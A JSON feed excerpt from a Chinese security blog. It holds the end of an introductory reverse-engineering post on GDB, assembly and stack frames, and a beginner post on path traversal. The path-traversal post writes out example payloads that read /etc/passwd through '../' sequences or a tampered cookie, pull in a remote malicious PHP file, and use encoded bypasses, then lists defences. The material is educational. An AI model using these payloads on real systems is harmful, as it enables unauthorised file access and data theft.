id=\"fnref1\">[1]</a></sup></p>\n</li>\n<li>\n<p>記憶體的位元組順序（Endianness）採 LSB（Least Significant Bit），或是常說的 little endian，表示把最高位的位元組放在最高的記憶體位址上，如下圖所示。這表示當我們輸入 <code>1234</code> 的時候，在 GDB 等軟體裡觀察記憶體時會看到的是 <code>\\x34\\x33\\x32\\x31</code>，這部分我們等等用 GDB 會再看到。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/little-endian.png\" /><figcaption><p>圖片來自 <a href=\"https://blog.gtwang.org/programming/difference-between-big-endian-and-little-endian-implementation-in-c/\">這篇文章</a></p>\n</figcaption></figure></p>\n</li>\n<li>\n<p>libc 函數的調用為 dynamically linked，亦即程式跑起來的時候，作業系統才會做 linking，把各個要調用的 libc 函數的位置填到這隻程式的一張表裡，方便執行時查詢呼叫。如果是 statically linked，在編譯過程中就會直接把這些外部函數都一起包到程式裡面，產出一個比較肥大的檔案。就像有人製作筆記時，會把課本內容抄到筆記本上，這樣所有資料一目瞭然，馬上就能找到，缺點是筆記厚厚一本；也有人僅是標註對應的課本頁數，這樣筆記較為精簡輕便，不過缺點是要找資料時必須另外參照課本。<sup class=\"footnote-ref\"><a href=\"#fn2\" id=\"fnref2\">[2]</a></sup></p>\n</li>\n<li>\n<p>跑在 x86–64 （64 bits）的結構上，64 bits 跟 32 bits 不只在暫存器名稱上不同，在 system call 的呼叫上也不一樣。</p>\n</li>\n<li>\n<p><code>not stripped</code>，表示在編譯過程中，debugging 資訊沒有被去掉，我們還看的到各個函數跟變數的名稱等等。</p>\n</li>\n</ol>\n<p>接著就可以執行看看！跑起來如下圖所示，會先跟使用者要三個數字，然後進行某些判斷，錯誤就會像這樣印出 ‘nope.’。因此，我們可以判斷拿到 flag 的條件就是讓這三個數字符合某些關係，檢查通過了就會印出 flag。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/execution.png\" /><figcaption><p>adder 跑起來！</p>\n</figcaption></figure></p>\n<hr>\n<h2 id=\"gdb-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F%E8%83%BD%E5%90%83%E5%97%8E%EF%BC%9F\"><a class=\"direct-link\" href=\"#gdb-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F%E8%83%BD%E5%90%83%E5%97%8E%EF%BC%9F\">#</a> GDB 是什麼？能吃嗎？</h2>\n<p>GDB 的全名是 GNU Debugger，顧名思義就是可以讓你一邊執行一個檔案一邊看到裡面的細節，也可以設置中斷點來逐步檢視記憶體裡面存的東西跟執行順序，方便開發者抓蟲。他還有很多強大的功能跟插件，例如最常用的 peda、gef、pwndbg 等等，可以讓你很方便地看到不同區段的資料甚至產生 shellcode ，大家如果有興趣可以再去逛逛。</p>\n<p>首先，執行 <code>gdb &lt;filename&gt;</code> 就可以在 GDB 裡面載入這個執行檔。再來就是用 <code>info file</code> 來觀察這個程式的進入點跟各區段位置<sup class=\"footnote-ref\"><a href=\"#fn3\" id=\"fnref3\">[3]</a></sup>。編譯器運作時，會把負責邏輯的程式碼跟變數等資料分區存放並加上對應的標籤以供程式運行時存取。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/gdb-info.png\" /><figcaption><p>info file 結果</p>\n</figcaption></figure></p>\n<p>通常我們會注意的幾個比較重要的區段為：</p>\n<p>1. <code>.text</code>：放置可執行的程式碼。權限為唯讀。</p>\n<p>2. <code>.rodata</code>：已初始化的資料，例如你在程式裡面寫死的字串或是常數。權限為唯讀。</p>\n<p>3. <code>.data</code>：已初始化的資料，例如你在程式裡面使用的全域變數。權限為可讀可寫。</p>\n<p>4. <code>.bss</code>：未初始化的資料。權限為可讀可寫。</p>\n<p>我們知道開始執行的地方是 <code>0x400860</code> 後，就可以用 <code>disas</code> 反編譯這段程式碼。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/disas-start.png\" alt=\"\"></p>\n<p>我們會觀察到這個函數有一個名字 <code>_start</code>。之前說過，<code>not stripped</code> 表示函數名稱都有被保留，所以我們也可以用函數名稱當作 reference 對象，在反編譯跟設中斷點的時候使用這個名稱。</p>\n<p>但是我們的程式裡面沒有寫到 <code>_start</code> 這個函數啊，他是哪裡來的呢？其實在編譯的過程中，編譯器會加入一個進入點 <code>_start</code> 函數，負責初始化一些 gcc/glibc 的準備工作再呼叫我們的 <code>main</code>，可以想成是在我們的程式外多加一層包裝來整頓好環境再開始執行主邏輯。所以，我們可以看到在 <code>&lt;+36&gt;</code> 的地方呼叫 <code>&lt;__libc_start_main@plt&gt;</code>，其實也就是透過 libc 的函數再間接呼叫我們所撰寫的主程式 <code>main</code>。</p>\n<p>這裡我們打個岔，回去看一下前面提到的 little endian。下面這張圖是在 GDB 裡面用 <code>x/&lt;num&gt;&lt;unit&gt; addr</code> 去看記憶體的指令，unit 有 b（bytes = 1 byte）、h（halfword = 2 bytes）、w（word = 4 bytes）、g（giant word = 8 bytes）這幾種，表示一次看的單位是多少位元，前面的 num 就是看多少單位，所以 <code>x/4x 0x400cd0</code>就是從地址 <code>0x400cd0</code>開始讀取 4 個 4 byte 的記憶體。unit 預設是 w，x 就是延續用最後一次設的單位。</p>\n<p><img src=\"/img/posts/crystal/reverse-01/gdb-endian.png\" alt=\"\"></p>\n<p>我們看到第一行的第一塊記憶體是紅色框起來的 <code>0x65746e45</code>，第二塊記憶體是黃色框起來的 <code>0x68742072</code>，那第三行一次讀 8 bytes 的時候怎麼順序交換變成黃色框在前面了呢？</p>\n<p>那就是因為 little endian 必須反過來讀，我們看到的 <code>\\x65\\x74\\x6e\\x45</code> 在記憶體裡面存的其實是 <code>\\x45\\x6e\\x74\\x65</code>，所以把第一行的框框們從屁股讀回來，黏一起就是 <code>\\x45\\x6e\\x74\\x65 \\x72\\x20\\x74\\x68</code>，就是第三行的第一個單位反過來的樣子啦！大家記得不要讀反囉！</p>\n<hr>\n<h2 id=\"%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98%EF%BC%9A%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80%E8%88%87%E8%A8%88%E7%AE%97%E6%A9%9F%E7%B5%90%E6%A7%8B\"><a class=\"direct-link\" href=\"#%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98%EF%BC%9A%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80%E8%88%87%E8%A8%88%E7%AE%97%E6%A9%9F%E7%B5%90%E6%A7%8B\">#</a> 基礎知識：組合語言與計算機結構</h2>\n<p>接下來，在進到 <code>main</code> 之前，先來講講一點基本的組合語言與計算機結構。</p>\n<p>組合語言是介於機器看得懂的二進位操作碼（opcode）與一般人看得懂的高階程式語言中間的一種低階語言，目的是讓二進位的程式變得可以閱讀與編輯。由於每一種 CPU 使用的機器指令（machine instruction）都不同，所以對應的組合語言也不一樣，這裡我們以 x86–64 為例介紹，遇到不懂或沒看過的都可以去查指令集哦。<sup class=\"footnote-ref\"><a href=\"#fn4\" id=\"fnref4\">[4]</a></sup></p>\n<p>最常見的指令如下，<code>S</code> 指 source，<code>D</code> 指 destination：</p>\n<ul>\n<li><code>mov D, S</code>：將某個值或是記憶體的位置寫入某個暫存器。把 <code>S</code> 裡面的值寫到 <code>D</code>裡面。</li>\n<li><code>push S</code>：將 <code>S</code> 裡面的值放到 stack 上。</li>\n<li><code>pop D</code>：把 stack 上的值放到 <code>D</code> 裡面，從 stack 移除。</li>\n<li><code>add D, S</code>、<code>sub D, S</code>：將 <code>S</code> 跟 <code>D</code> 裡面的值相加相減，結果放在 <code>D</code> 裡面。</li>\n<li><code>call Label</code>：呼叫帶有 Label 標籤的函數，這時程式會為這個函數創一個新的 stack frame。</li>\n<li><code>ret</code>：終止當前函數的執行，返回到上一層的函數。</li>\n</ul>\n<p>還有進行條件判斷的 <code>cmp</code>、<code>test</code> 跟各種跳躍的 <code>jmp</code> 家族，之後我們遇到再說明。</p>\n<p>要注意的是，上面的寫法是 Intel 語法，如果是 AT&amp;T 語法就將 <code>S</code> 跟 <code>D</code>反過來（如 <code>mov S,D</code>）。</p>\n<p>首先，我們必須先理解暫存器與記憶體。CPU 只跑指令，而資料儲存交給記憶體，當 CPU 需要用到資料時就會向記憶體請求。我們可以把記憶體想像成一間很小的圖書館，門口有一個櫃子放本週最熱門的書籍，進門後一樓放各個老師指定的課本與參考資料，其他書籍都放在地下倉庫內。那麼今天有學生想借書，他要是在門口一看就能找到想要的那本當然是最有效率的，不然他就得走進去，在層架間仔細翻找，也許要一個小時才能找到。要是更慘都沒有，還要勞煩管理員到倉庫裡搜尋，說不定要一兩天功夫才行。越多的資料量查詢起來越沒有效率，反之，越少的資料越能快速存取。</p>\n<p>記憶體常見的結構如下圖。最上層是 CPU 暫存器（register），是存取最快速頻繁也最小的記憶體。再往下至快取（cache）、RAM、 hard drive ，能存的資料越來越多、體積越來越大、存取速度也越來越慢。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/memory-model.png\" /><figcaption><p>memory model，取自<a href=\"https://www.itread01.com/content/1548607715.html\">組合語言入門教程</a></p>\n</figcaption></figure></p>\n<p>要看懂組合語言，首要之務就是了解暫存器。</p>\n<p>在 x86–64 結構下，暫存器都是 64 bits = 8 bytes 大小<sup class=\"footnote-ref\"><a href=\"#fn5\" id=\"fnref5\">[5]</a></sup>，暫存器也可以部分存取，以 <code>rax</code> 為例，<code>eax</code> 指 <code>rax</code> 的後 4 bytes、再對切得到 <code>ax</code> 為倒數 2 bytes、然後再切分為 <code>ah</code> 與 <code>al</code>。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/reg-size.png\" /><figcaption><p>register sizes</p>\n</figcaption></figure></p>\n<p>暫存器的種類也非常多，一般來說，有 16 個一般用途暫存器，為 <code>rax</code> <code>rbx</code> <code>rcx</code> <code>rdx</code> <code>rdi</code> <code>rsi</code> <code>rbp</code> <code>rsp</code> <code>r8-r15</code>，意指可能被用於任何運算操作。與之相對，屬於特殊用途暫存器的 <code>rip</code> <code>rflags</code>就不是可以拿來運算調用的。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/x64-regs.png\" /><figcaption><p>x64 registers，來自<a href=\"https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf\">布朗大學講義</a></p>\n</figcaption></figure></p>\n<p>每個暫存器傳統上都有特殊用途，例如：</p>\n<ul>\n<li><code>rax</code> 常用於放函數回傳值跟乘除法運算結果</li>\n<li><code>rbx</code> 常用於放 base address</li>\n<li><code>rcx</code> 常用於回圈中的計數器（counter）</li>\n<li><code>rdx</code> 常用於存放資料</li>\n<li><code>rbp (base pointer)</code> 指向當前函數 stack 上的底部（stack frame 下緣）</li>\n<li><code>rsp (stack pointer)</code> 指向當前函數 stack 上的頂部（stack frame 上緣）</li>\n<li><code>rip (instruction pointer)</code> 指向下一個要執行的 CPU 指令</li>\n</ul>\n<p>再來，我們看看 stack 跟 heap 。C 程式一般的記憶體配置如下圖。上面是高的記憶體位址（<code>0xffff…</code>）下面是低的記憶體位址（<code>0x0000…</code>），heap 在 <code>.bss</code> 區段之後開始、隨著動態記憶體配置增加慢慢往上長，而 stack 則是從高的記憶體位址開始往下長。stack 放置的是靜態的、已知大小的資料，例如每一個函數內的區域變數以及函數的參數跟地址等等。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/memory-layout.png\" /><figcaption><p>memory layout，取自 <a href=\"https://www.geeksforgeeks.org/memory-layout-of-c-program/\">geekforgeeks</a></p>\n</figcaption></figure></p>\n<p>程式執行時函數的呼叫就會以 stack frame 的方式層層堆疊，也可以想成記憶體是一個直立式的櫃子、每個函數是一本一本的書籍，裡面記載了這個函數內的各種變數，當一個函數被呼叫時，就把這本書平放到櫃子中書堆的最上面，完成後再從書堆上拿下來。</p>\n<p>那麼，誰去管理這個櫃子中的書堆，確保書籍有好好的被堆疊跟移除呢？</p>\n<p>管理函數之間參數傳遞、並規定誰負責清除堆疊的一套約定，我們稱為 calling convention ，或是國家教育研究院譯為呼叫約定。在不同的系統架構下會有不同的 calling convention，以 AMD64 系統（用於 Solaris、Linux、FreeBSD、MacOS 等 Unix 跟 Unix-like 系統）的 x86–64 為例，儲存函數前六個參數的暫存器依序為 <code>rdi</code> <code>rsi</code> <code>rdx</code> <code>rcx</code> <code>r8</code> <code>r9</code>，而函數 return 的回傳值則會放在 <code>rax</code> 中（若大於一個暫存器的空間，例如回傳值在 64–128 bit，則會放在 <code>rax</code> 跟 <code>rdx</code>）。在呼叫一個函數前，呼叫者（caller）會把被呼叫的函數（callee）的參數放到暫存器中，再透過 <code>call</code> 這個指令去執行 callee。而進入 callee 後，在進行主邏輯前，callee 會先創造自己的 stack frame，在 stack 上留一塊記憶體空間。邏輯執行結束時，用 <code>leave</code> 把 stack frame 裡的東西清掉，最後 <code>ret</code> 把控制權交回 caller。</p>\n<p>『創造自己的 stack frame』這個動作又稱為 function prologue，可以類比為書的前言、鋪成。實作上其實有一個組語指令叫 <code>enter n,0</code>，不過因為他太慢了，所以通常用下面這段取代：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">push  ebp<br>mov   ebp, esp     # ebp = esp<br>sub   esp,  $n     # allocate space on the stack</code></pre>\n<p>搭配下圖由左而右來看，藍色區塊是 caller 的 stack frame，黃色是進行 <code>call</code> 後把當前執行到的地方，也就是等等 callee 結束執行要返回的地方給存起來。第一行的 <code>push</code> 把當前的 <code>ebp</code> 放到 stack 上面，等同存好現在的 stack 基底，方便函數結束後回復到前一個函數的狀態，此時 stack 從左一變成左二，多了綠色的部分。第二行把 <code>ebp</code> 指到現在 <code>esp</code> 的位置，stack 從左二變成左三。第三行把 <code>esp</code> 向上移大小為 n 的空間，也就是預留出 callee 函數所需要的記憶體，stack 變成最後一張，創造出了紅色部分的另一個 stack frame。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/prologue.png\" /><figcaption><p>function prologue</p>\n</figcaption></figure></p>\n<p>『清掉自己的 stack frame』這個動作又稱為 function epilogue，可以類比為書的後言。使用的組語指令叫 <code>leave</code>，概念上等同下面這段：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">mov   esp, ebp     # esp = ebp<br>pop   ebp          # restore old ebp</code></pre>\n<p>搭配下圖由左而右來看，原始狀態就是前面 function prologue 完的樣子。第一行把 <code>esp</code> 指回 <code>ebp</code> 的地方，stack 從左一變成左二，這下子紅色的 callee stack frame 就被釋放出來了。第二行把 stack 上的值拿下來放回 <code>ebp</code>，也就是把舊的 <code>ebp</code> 位置還原回來，stack 變成最右邊的樣子，當前的記憶體最上面就回到 caller 的 stack frame 了。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/epilogue.png\" /><figcaption><p>function epilogue</p>\n</figcaption></figure></p>\n<hr>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> 結語</h2>\n<p>到這裡為止，我們其實都還沒開始逆向呢XDDD 先具備一些基礎知識是很重要的，知己知彼才能見招拆招嘛！</p>\n<p>這一篇我們先講解了逆向的起手式、基本的組合語言以及計算機結構、還有編譯完的程式碼以及記憶體的運作方式。上面只是針對AMD 的 x86–64 這一種結構做說明，有興趣的話可以去查查不同結構下的組合語言指令集跟 calling convention，可是很不同的喔！你也可以把這篇用到的小程式跟你電腦上別的程式用 GDB 或是 IDA 打開來看看，比較一下差異。</p>\n<p>總之，我們總算把前置準備完成，下一集我們來正式開始看 <code>main</code> ！</p>\n<hr class=\"footnotes-sep\">\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p>小提醒：千萬別執行來路不明的檔案哦！一般來說提供軟體的廠商都會在下載點提供一個 MD5 checksum，也就是將這個檔案的資料做雜湊運算得出的一個值，你可以利用 linux 內建的 <code>md5sum</code> 指令驗明正身！如果 <code>md5sum &lt;file&gt;</code> 的到的結果跟網站標示的一樣才是對的！ <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn2\" class=\"footnote-item\"><p>在 dynamically linked 的時候，如果想看到有哪些外部函示庫被調用，以及他們的 base address，可以用 <code>ldd &lt;filename&gt;</code> 查看，這部分的利用以後有 pwn 入門系列再來說明 XDD <a href=\"#fnref2\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn3\" class=\"footnote-item\"><p>或者我們也可以用 <code>objdump</code> 來看各區段的位置以及權限，指令為 <code>objdump -h &lt;filename&gt;</code>，同一個檔案的輸出會長這樣 <a href=\"#fnref3\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn4\" class=\"footnote-item\"><p>指令集：<a href=\"https://software.intel.com/content/www/us/en/develop/articles/intel-sdm.html\">Intel 64 &amp; 32 bits</a>、<a href=\"https://en.wikipedia.org/wiki/X86_instruction_listings\">維基百科</a>、<a href=\"https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf\">x64 cheat sheet</a> <a href=\"#fnref4\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n<li id=\"fn5\" class=\"footnote-item\"><p>另外其實有 128 bit 的暫存器，例如用來傳遞浮點數的參數時使用的是 <code>XMM</code> 系列，calling convention 跟一般用途暫存器類似，<code>XMM0-XMM7</code> 用於傳遞參數，回傳值則會放在 <code>XMM0</code></p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/objdump.png\" /><figcaption><p>objdump output</p>\n</figcaption></figure> <a href=\"#fnref5\" class=\"footnote-backref\">↩︎</a></p>\n</li>\n</ol>\n</section>\n<hr class=\"footnotes-sep\">\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"> <a href=\"#fnref1\" class=\"footnote-backref\">↩︎</a></li>\n<li id=\"fn2\" class=\"footnote-item\"> <a href=\"#fnref2\" class=\"footnote-backref\">↩︎</a></li>\n<li id=\"fn3\" class=\"footnote-item\"> <a href=\"#fnref3\" class=\"footnote-backref\">↩︎</a></li>\n<li id=\"fn4\" class=\"footnote-item\"> <a href=\"#fnref4\" class=\"footnote-backref\">↩︎</a></li>\n<li id=\"fn5\" class=\"footnote-item\"> <a href=\"#fnref5\" class=\"footnote-backref\">↩︎</a></li>\n</ol>\n</section>\n",
      "date_published": "2021-06-04T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-path-traversal/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-path-traversal/",
      "title": "零基礎資安系列（五）-路徑遍歷（Path Traversal）",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<blockquote>\n<p>路徑遍歷（Path Traversal）就像想像網站是一個博物館，裡面有許多房間，其中有些房間是 Staff Only 而且門上了鎖不讓訪客進入，但有趣的是博物館裡的每一個房間都有通風口，只要知道房間位置，就可以透過其他房間的通風口前往 Staff Only 的房間獲得所有你想要的資料。</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E9%87%8B%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%87%8B%E4%BE%8B\">#</a> 釋例</h2>\n<p>今天想和大家聊聊在網站安全上攻擊者容易執行但卻常被開發者忽略的路徑遍歷（Path Traversal）攻擊，談談關於路徑遍歷在網站安全上可能造成的風險以及如何預防。</p>\n<p>通常路徑遍歷也被稱目錄遍歷（Directory Traversal），但他有個更具體而且蠻可愛的名字叫做點點斜線攻擊（Dot dot slash attack），那為什麼會叫這個名字呢？</p>\n<p>舉個實際的例子，Linux 中，目錄的顯示是 / Users / hello / Desktop / file，如果使用者輸入 cd ../ 指令時，當前的目錄就會回到上一層，那這會有什麼問題？當這個指令是任一使用者測試在網站 URL 上輸入 ../ 都可以成功執行回到網站目錄上一層的時候問題就大條了，這表示告訴攻擊者，我有路徑遍歷的風險，你可以開始嘗試囉！</p>\n<h2 id=\"%E5%B8%B8%E8%A6%8B%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95\">#</a> 常見的路徑遍歷攻擊手法</h2>\n<p>以下拿幾個路徑遍歷的攻擊常見的範例來說明：</p>\n<p>假設網址呈現的方式為：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">https://www.example.com/get-files?file=report.pdf</code></pre>\n<p>而攻擊者在真正的執行路徑遍歷攻擊以前，常會使用絕對路徑遍歷的手法探測目標網站的網站架構，例如說：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">https://www.example.com/get-files?file=/etc/passwd</code></pre>\n<p>，嘗試以常用的系統絕對路徑試探是否有回應當，當伺服器回應有關網站應用程序中的錯誤的信息時，攻擊者可以更容易猜測正確的位置（例如顯示原始碼的文件路徑）。</p>\n<h3 id=\"1.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%A8%AA%E5%95%8F%E7%9B%AE%E9%8C%84%E5%A4%96%E7%9A%84%E8%B7%AF%E5%BE%91%EF%BC%9A\"><a class=\"direct-link\" href=\"#1.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%A8%AA%E5%95%8F%E7%9B%AE%E9%8C%84%E5%A4%96%E7%9A%84%E8%B7%AF%E5%BE%91%EF%BC%9A\">#</a> 1.攻擊者嘗試訪問目錄外的路徑：</h3>\n<pre class=\"language-txt\"><code class=\"language-txt\">https://www.example.com/../../../../some dir/some file</code></pre>\n<p>攻擊者藉由多次的 ../ 來超脫當前的目錄，訪問不在目錄下的資料。</p>\n<h3 id=\"2.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%AE%80%E5%8F%96%E7%9B%AE%E9%8C%84%E4%B8%AD%E7%9A%84%E7%B3%BB%E7%B5%B1%E6%AA%94%E6%A1%88\"><a class=\"direct-link\" href=\"#2.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%AE%80%E5%8F%96%E7%9B%AE%E9%8C%84%E4%B8%AD%E7%9A%84%E7%B3%BB%E7%B5%B1%E6%AA%94%E6%A1%88\">#</a> 2.攻擊者嘗試讀取目錄中的系統檔案</h3>\n<pre class=\"language-txt\"><code class=\"language-txt\">https://www.example.com/get-files?file=/etc/passwd</code></pre>\n<p>攻擊者藉由 /etc/passwd 來嘗試直接讀取系統檔案，如果真的被攻擊者讀取到 /etc/passwd 檔的話，攻擊者很有可能藉此解讀 root user 的密碼，另外，值得一提的是，如果網站架在 Windows 的系統中的話，攻擊者只能訪問Web根目錄所在的磁碟分區，但如果是在 Linux 系統中的話，攻擊者則可以訪問整個磁碟。</p>\n<h3 id=\"3.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E4%BD%BF%E7%B6%B2%E7%AB%99%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E6%88%96%E8%85%B3%E6%9C%AC\"><a class=\"direct-link\" href=\"#3.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E4%BD%BF%E7%B6%B2%E7%AB%99%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E6%88%96%E8%85%B3%E6%9C%AC\">#</a> 3.攻擊者嘗試使網站引用外部文件或腳本</h3>\n<pre class=\"language-txt\"><code class=\"language-txt\">https://www.example.com/get-files?file=http://other-site.com/malicius-code.php</code></pre>\n<p>攻擊者藉由嘗試將其他網站中的文件包含到當前網站的目錄，讓系統去引用攻擊者的惡意外部文件或腳本，進而達到提權或是竊取機敏資料的目的。</p>\n<h3 id=\"4.%E6%94%BB%E6%93%8A%E8%80%85%E4%BB%A5%E7%AB%84%E6%94%B9-http-%E7%9A%84%E8%AB%8B%E6%B1%82%E8%97%89%E6%AD%A4%E5%B0%8D%E4%BC%BA%E6%9C%8D%E5%99%A8%E7%99%BC%E8%B5%B7%E6%94%BB%E6%93%8A\"><a class=\"direct-link\" href=\"#4.%E6%94%BB%E6%93%8A%E8%80%85%E4%BB%A5%E7%AB%84%E6%94%B9-http-%E7%9A%84%E8%AB%8B%E6%B1%82%E8%97%89%E6%AD%A4%E5%B0%8D%E4%BC%BA%E6%9C%8D%E5%99%A8%E7%99%BC%E8%B5%B7%E6%94%BB%E6%93%8A\">#</a> 4.攻擊者以竄改 HTTP 的請求藉此對伺服器發起攻擊</h3>\n<pre class=\"language-txt\"><code class=\"language-txt\">GET /vulnerable.php HTTP/1.0   <br>Cookie: TEMPLATE=../../../../../../../../../etc/passwd</code></pre>\n<p>與上列不同的是攻擊者不是經由竄改 URL 而達成路徑遍歷的攻擊，而是藉由竄改 HTTP 的請求以多次的../來超脫當前網站的目錄，使伺服器回應傳送 etc/passwd 解讀 root user 的密碼。</p>\n<h2 id=\"%E8%AE%8A%E5%BD%A2%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A\"><a class=\"direct-link\" href=\"#%E8%AE%8A%E5%BD%A2%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A\">#</a> 變形的路徑遍歷攻擊</h2>\n<p>在看完上述所說明的攻擊之後，你可能想說那我只要擋掉使用者在我的 URL 以及 HTTP 請求的輸入進行驗證及限制，不允許../的出現，那麼針對路徑遍歷的攻擊也就無用武之地了吧？</p>\n<p>一個好消息和一個壞消息告訴你，好消息是你的觀念正確，對URL 以及 HTTP 請求的輸入進行驗證及限制的確是避免路徑遍歷攻擊的應對策略之一，但壞消息是../是有變形的，而且還有很多種變形，其中最常見的變形就是在<strong>零基礎資安系列(二)-認識 XSS(Cross-Site Scripting)</strong> 中和大家提過的HTML Encoder 會將 <code>%2e%2e%2f</code> 解析為 ../ 繞過針對 ../ 的檢查，除此之外還有 UTF-8 編碼 <code>%c1%1c</code> 會被解析為 / ，以及若是更進階一點的話攻擊者還可能使用 xor 概念，<code>%d0^%ff = /</code> 的編碼方式，繞過限制的字元，如果大家對攻擊者可能使用的進階 injection 有興趣，我之後會再寫一篇文章和大家說明，在這裡主要想告訴大家的是限制字元的輸入是個好的應對策略，但前提是將所有攻擊者可能的攻擊方式全部寫進規則中，否則仍然會使攻擊者有機可趁。</p>\n<h2 id=\"%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6\"><a class=\"direct-link\" href=\"#%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6\">#</a> 如何防禦</h2>\n<p>上面說了這麼多攻擊者可能的攻擊方式，又表示有那麼多變形的路徑遍歷攻擊，那難道我們對攻擊者就無計可施了嗎？</p>\n<p>當然不是！依據我的經驗，針對路徑遍歷攻擊的防禦可以從三個方面來看</p>\n<p><strong>1.輸入驗證</strong></p>\n<p>針對路徑遍歷攻擊最直覺的防禦就是驗證及限制所有在 URL 以及 HTTP 請求，不允許輸入 ../ 以及其他變形的輸入，這方面的防禦強度會在於網站對於輸入驗證的規則完善度而決定。</p>\n<p><strong>2.權限控管</strong></p>\n<p>在開發和部署網頁應用程式的時候盡可能的以最小的權限執行，盡可能的刪除所有不常使用或權限過大的使用者並取消 Guest 角色，建立完整的 ACL（Access Control List） ，且確保文件的可讀可寫權限也的確受到控管（例如Linux 系統盡可能不要有權限 777 的文件，這會讓這份文件全世界可讀可寫），這樣的話即使攻擊者成功的查看網頁目錄，也會因為權限問題而導致無法存取文件，最多只能得知網站目錄架構及檔名。</p>\n<p><strong>3.資料處理</strong></p>\n<p>之所以把資料處裡放在最後一步是因為我認為資料處理是面對攻擊者的最後一道防線，即使攻擊者可以繞過輸入驗證，成功獲得瀏覽目錄的權限，但如果目錄中沒有隱密資料或是將重要資料另外備份在其他的伺服器，例如密碼檔、已經沒有被引用的舊文件、網站備份的資料、Log 紀錄、系統版本紀錄 等，攻擊者在沒有獲得任何有效資料的情況下也只能繼續嘗試其他的攻擊路徑。</p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>雖然資料處理是三種防禦中面對攻擊者的最後一道防線，但我認為最重要的防禦還是針對路徑遍歷攻擊的輸入驗證，原因是因為對攻擊者來說，一但發現網站的輸入驗證規則設置周全或是一般常見的手法都沒辦法獲得任何有效的資料時，攻擊者通常會選擇另尋目標，所以我建議的方式會是建立一個針對路徑遍歷攻擊包含 ../ 及 HTML Encoder 編碼規則的輸入驗證會是針對路徑遍歷攻擊首先該做的事，接著才是刪除所有不常使用的使用者權限並且不允許遠端操作，將當前網站目錄中非必要存在的重要檔案另外備份並在當下的目錄中刪除，以上兩件事情可以依據公司的情況做調整，例如帳號權限複雜先不動或重要的檔案位置混亂不好歸納所以先處理權限 等，以公司承擔成本較低的方式自行取捨。</p>\n<p>當以上三種防禦都進行之後，即使攻擊者願意花時間嘗試除了一般常見規則的路徑遍歷攻擊外再特別設計攻擊，並且在進入目錄後連一般使用者權限都沒有的情況下嘗試提權，再提權成功後，看著沒有高重要性資料的目錄同常也會感到挫折。</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> 延伸閱讀</h2>\n<h3 